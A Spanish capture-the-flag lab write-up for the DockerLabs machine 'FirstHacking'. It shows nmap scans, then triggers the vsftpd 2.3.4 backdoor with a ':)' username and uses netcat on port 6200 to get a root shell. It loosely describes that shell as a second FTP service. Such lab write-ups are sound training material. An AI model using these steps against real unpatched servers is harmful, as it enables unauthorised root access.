<section align="center">

# 💥FirstHacking Write Up💥

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20Facil-green?style=for-the-badge)
![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)

</section>

## 🚀 Despliegue

Una vez descargado el ctf, lo extreamos y accedemos a su respectiva carpeta desde la terminal, luego iniciamos la maquina con:

```bash
sudo bash auto_deploy.sh firsthacking.tar
```

## 🔍Escaneo y enumeracion

para empezar con el ctf, realizamos un escaneo general con nmap:

```bash
nmap 172.17.0.2
```

nos devuelve esto:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-07 00:26 -03
Nmap scan report for 172.17.0.2
Host is up (0.00027s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

aunque ya nos hacemos una idea de que puerto esta abierto, que seria el 21 con el servico **ftp**, pueden haber mas servicios en los puertos no comunes, para una mayor precision, podemos realizar un escaneo a todos los puertos:

```bash
nmap -p- 172.17.0.2
```
    
nos devuelve:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-07 00:26 -03
Nmap scan report for 172.17.0.2
Host is up (0.00036s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 5.14 seconds
```

una vez estamos seguros que es el unico puerto abierto, realizamos un escaneo especifico y detallado para saber mas sobre ese servicio:

```bash
nmap -p21 -sC -sV 172.17.0.2
```

### 🛠️Parametros usados

| Parametro | Descripcion |
| :--- | :--- |
| **`-p21`** | indico que solo quiero un escaneo para ese puerto en especifico |
| **`-sC`** | ejecuta varios scripts basicos para obtener informacion extra |
| **`-sV`** | me muestra la version que usa este servicio ftp |

nos devuelve:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-07 00:26 -03
Nmap scan report for 172.17.0.2
Host is up (0.00065s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.74 seconds
```
<br>

## Pequeño analisis e investigacion sobre la version 2.3.4 de vsftpd

en este escaneo obtenemos informacion muy importante, ya que investigando sobre esa version,es antigua y con una vulnerabilidad critica conocida.
  
De aqui, tenemos dos caminos posibles, uno es usar una herramienta que automatiza el ataque y otra es hacerlo manualmente, yo lo hare manualmente.

## ☠️Explotacion

El primer paso para atacar manualmente este servicio, debemos entender que esta vulnerabilidad fue provocada de forma conciente, ya que la idea es que al poner ":)" en el usuario al intentar conectarte al servicio ftp, se iniciaria otro servicio ftp en el puerto 6200 con usuario root.

nos conectamos con:

```bash
ftp 172.17.0.2
```

al hacerlo, nos pedira un usuario, podemos cualquier cosa pero lo terminamos con la carina feliz ":)" (sin las comillas), luego al pedir contraseña, ponemos tambien cualquier cosa.

puede dar error o puede quedarse cargando, sea cual sea, abrimos una nueva terminal y con netcat intentamos conectamos por el puerto 6200:

```bash
nc -v 172.17.0.2 6200
```
### 🛠️Parametros usados

| Parametro | Descripcion |
| :--- | :--- |
| **`-v`** | indico que quiero informacion sobre lo que sucede, no es obligatorio usarlo |
| **`6200`** | indico el puerto |

lo que nos devuelve:

```bash
Connection to 172.17.0.2 6200 port [tcp/*] succeeded!
whoami
root
```

